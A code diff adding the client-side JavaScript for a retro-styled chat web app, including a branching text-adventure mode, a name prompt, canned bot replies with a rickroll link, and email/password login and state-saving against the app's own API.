+  const name = Store.get("name", CONFIG.defaultName);
+  for (const raw of node.lines){
+    const dialogue = typeof raw === "string" ? { text: raw } : raw;
+    if (!dialogue || typeof dialogue !== "object") continue;
+
+    const text = String(dialogue.text ?? "").replaceAll("{name}", name);
+    const speaker = String(dialogue.speaker ?? node.speaker ?? "").trim();
+    const line = addLine("sys");
+    if (speaker) line.append(span("game-speaker", `${speaker} > `));
+    const content = span("", "");
+    line.append(content);
+
+    if (!(await typeInto(content, text, CONFIG.speedReply, sid))) return;
+    await sleep(reducedMotion() ? 0 : CONFIG.bootPause);
+    if (sid !== session || !gameState) return;
+  }
+
+  if (node.end){
+    await endGame();
+    return;
+  }
+  if (!Array.isArray(node.choices) || node.choices.length === 0){
+    addLine("sys", "Game configuration error: this scene needs choices or end: true.");
+    returnToChat();
+    return;
+  }
+
+  gameBusy = false;
+  showGameChoices(node);
+}
+
+async function chooseGameOption(choice, panel){
+  if (!gameState || gameBusy) return;
+  if (!choice || typeof choice.label !== "string" || !STORY[choice.next]){
+    addLine("sys", CONFIG.gameInvalidChoice());
+    return;
+  }
+
+  gameBusy = true;
+  panel?.remove();
+  addLine("you").append(span("tag", CONFIG.youTag), choice.label);
+  toBottom();
+
+  gameState.node = choice.next;
+  await playNode();
+}
+
+function quitGame(){
+  if (!gameState) return;
+  const name = Store.get("name", CONFIG.defaultName);
+  log.querySelectorAll(".game-choices").forEach(panel => panel.remove());
+  addLine("sys", CONFIG.gameQuit(name));
+  returnToChat();
+}
+
+// Ending a route returns to the normal chat input. The daily replay lock remains unchanged.
+async function endGame(){
+  const sid = session;
+  const name = Store.get("name", CONFIG.defaultName);
+  Store.set("lastPlayed", todayKey());
+  gameState = null;
+  gameBusy = false;
+
+  const completed = await typeInto(addLine("sys"), CONFIG.gameFarewell(name), CONFIG.speedReply, sid);
+  if (!completed || sid !== session) return;
+  addLine("sys", "[ STORY END ]");
+  returnToChat();
+}
+
+// [J5] runBoot — ĐƯỢC VIẾT LẠI: boot xong thì hỏi tên (nếu chưa có tên lưu),
+// rồi mới mở chat. Nếu tài khoản đã có tên lưu trên server thì bỏ qua bước hỏi.
+async function runBoot(){
+  const sid = session;
+  for (const text of CONFIG.bootLines){
+    if (!(await typeInto(addLine("sys"), text, CONFIG.speedBoot, sid))) return;
+    await sleep(reducedMotion() ? 0 : CONFIG.bootPause);
+    if (sid !== session) return;
+  }
+  const saved = Store.get("name");
+  if (saved){
+    addLine("sys"); addLine("sys", CONFIG.hint); addLine("sys");
+    setMode("chat");
+    inputRow.classList.add("ready"); userInput.disabled = false; userInput.focus();
+    return;
+  }
+  setMode("name");
+  if (!(await typeInto(addLine("sys"), CONFIG.namePrompt, CONFIG.speedBoot, sid))) return;
+  inputRow.classList.add("ready"); userInput.disabled = false; userInput.focus();
+}
+
+// [J6] handleSubmit — ĐƯỢC VIẾT LẠI: phân luồng theo mode (name/game/chat),
+// trong "chat" thì "/..." đi vào lệnh (CMD1), còn lại đi vào chat thường như cũ.
+async function handleSubmit(ev){
+  ev.preventDefault();
+  const text = userInput.value.trim();
+  const sid = session;
+  userInput.value = "";
+
+  if (mode === "name"){ userInput.disabled = true; await submitName(text, sid); return; }
+  if (!text) return;
+  userInput.disabled = true;
+
+  // Story mode is controlled only by the clickable choices rendered in the scroll log.
+  if (mode === "game") return;
+
+  addLine("you").append(span("tag", CONFIG.youTag), text);
+  toBottom();
+
+  if (text.startsWith("/")){
+    await runCommand(text);
+    // /exit chủ động ẩn và khóa input, không bật lại ngay sau khi chạy lệnh.
+    if (sid === session && inputRow.classList.contains("ready") && mode === "chat"){
+      userInput.disabled = false;
+      userInput.focus();
+    }
+    return;
+  }
+
+  logMessage(Store.get("name", CONFIG.defaultName), text);
+  await sleep(CONFIG.thinkDelay);
+  if (sid !== session) return;
+
+    const reply = pickReply(text);
+    const cfgLang = LANG_MODES[langMode];
+    const mainText = pickLangText(reply, cfgLang.main);
+    const noteText = cfgLang.note ? pickLangText(reply, cfgLang.note) : "";
+
+    const line = addLine("DYGL");
+    const main = span("reply-main", "");
+    line.append(span("tag", CONFIG.DYGLTag), main);
+
+    if (!(await typeInto(main, mainText, CONFIG.speedReply, sid))) return;
+
+    if (reply.linkUrl) {
+      const link = document.createElement("a");
+      link.href = reply.linkUrl;
+      link.target = "_blank";
+      link.rel = "noopener noreferrer";
+      link.textContent = "[rickroll]";
+      main.append(" ", link);
+    }
+
+    if (noteText) {
+      addLine("reply-note", `${cfgLang.note.toUpperCase()} > ${noteText}`);
+    }
+
+    logMessage("DYGL", mainText + (reply.linkUrl ? " [rickroll]" : "") + (noteText ? ` (${noteText})` : ""));
+    userInput.disabled = false;
+    userInput.focus();
+}
+
+// [J7] Event wiring, clock, account bootstrap and chat startup.
+inputRow.addEventListener("submit", handleSubmit);
+let startedAt = Date.now();
+function renderClock(){
+  const s = Math.floor((Date.now() - startedAt) / 1000), p = n => String(n).padStart(2, "0");
+  clockEl.textContent = `${CONFIG.clockLabel} ${p(Math.floor(s / 60))}:${p(s % 60)}`;
+}
+hangupBtn.addEventListener("click", () => {
+  session++;
+  gameState = null;
+  gameBusy = false;
+  setMode("name");
+  log.replaceChildren(); userInput.value = "";
+  inputRow.classList.remove("ready"); userInput.disabled = true;
+  startedAt = Date.now(); renderClock();
+  runBoot();
+});
+
+$("authToggle").addEventListener("click", () => {
+  setAuthMode(authMode === "login" ? "register" : "login");
+});
+
+$("authForm").addEventListener("submit", async event => {
+  event.preventDefault();
+  const submitButton = $("authSubmit");
+  const email = $("authEmail").value.trim();
+  const password = $("authPassword").value;
+  submitButton.disabled = true;
+  setAuthMessage(authMode === "register" ? "Creating account..." : "Signing in...");
+  try{
+    const endpoint = authMode === "register" ? "/api/auth/register" : "/api/auth/login";
+    const payload = await apiRequest(endpoint, {
+      method: "POST",
+      body: { email, password },
+    });
+    $("authPassword").value = "";
+    await enterAuthenticatedApp(payload);
+  }catch(error){
+    setAuthMessage(error.message);
+  }finally{
+    submitButton.disabled = false;
+  }
+});
+
+$("logoutBtn").addEventListener("click", logoutAccount);
+window.addEventListener("pagehide", () => {
+  if (!isAuthenticated) return;
+  // Best-effort final save when the tab closes or navigates away.
+  const payload = JSON.stringify(accountState);
+  fetch("/api/state", {
+    method: "PUT",
+    headers: {
+      "Content-Type": "application/json",
+      "X-CSRF-Token": csrfToken,
+    },
+    body: payload,
+    credentials: "same-origin",
+    keepalive: true,
+  }).catch(() => {});
+});
+
+setInterval(renderClock, 1000);
+restoreAccountSession();
+</script>
+</body>
+</html>
